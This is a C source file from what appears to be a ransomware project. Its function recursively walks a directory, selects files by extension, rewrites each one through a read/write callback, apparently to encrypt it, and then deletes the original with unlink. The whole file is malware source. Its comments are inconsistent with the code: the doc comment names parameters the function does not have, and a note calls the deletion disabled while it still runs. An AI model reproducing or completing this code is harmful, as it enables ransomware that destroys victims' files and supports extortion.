#include "fournights.h"
/**
  * recurse_ls - Searches through a target directory for all files,
 (* and builds a linked list of those files
  * @rootpath: target directory
  * @head: head of the linked list
  * @list_extensions: ptr to a linked list of file extensions
  * Return: Returns a pointer to the head of the linked list
 **/
void *recurse_ls(char *dirname, ransom_t *ransom)
{
	size_t len_rootpath, len_filename = 0;
	char *filepath;
	DIR *dir;
	struct dirent *read;
	struct stat file_info;

	dir = opendir(dirname);
	if (!dir)
		return (NULL);
	len_rootpath = my_strlen(dirname);
	filepath = my_calloc(PATH_MAX, sizeof(char));
	my_strncat(filepath, dirname, 0, len_rootpath);
	while ((read = readdir(dir)))
	{
		if (my_strncmp(read->d_name, ".", 1) == 0 ||
			my_strncmp(read->d_name, "..", 2) == 0)
			continue;
		len_filename = my_strlen(read->d_name);
		my_strncat(filepath, read->d_name, len_rootpath, len_filename);
		lstat(filepath, &file_info);
#ifndef NO_DEBUG
		printf("Is %s a directory? %d\n", read->d_name, binary_search_string(read->d_name, len_filename, ransom));
		getchar();
#endif
		if (S_ISDIR(file_info.st_mode) != 0)
		{
			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
			recurse_ls(filepath, ransom);
		}
		else if ((binary_search_string(read->d_name, len_filename, ransom) != 0) && S_ISREG(file_info.st_mode) != 0)
		{
			ransom->target_file_buf->file_info = file_info;
			my_strncat(ransom->target_file_buf->filepath, filepath, 0, my_strlen(filepath));
			do
			{
				ransom->target_file_buf->bytes_read = read_file(ransom->target_file_buf->filepath, ransom, write_file);
#ifndef NO_DEBUG
				debug_list(ransom->target_file_buf);
#endif
			}
			while(ransom->target_file_buf->file_offset < ransom->target_file_buf->file_info.st_size);
			/* reset bytes read and file_offset.  */
			ransom->target_file_buf->file_offset = 0;
			ransom->target_file_buf->bytes_read = 0;
			/* Disabled for debugging. Will remove reference to original file
			*/
			unlink(filepath);
		}
	}
	free(filepath);
	closedir(dir);
	return (ransom);
}
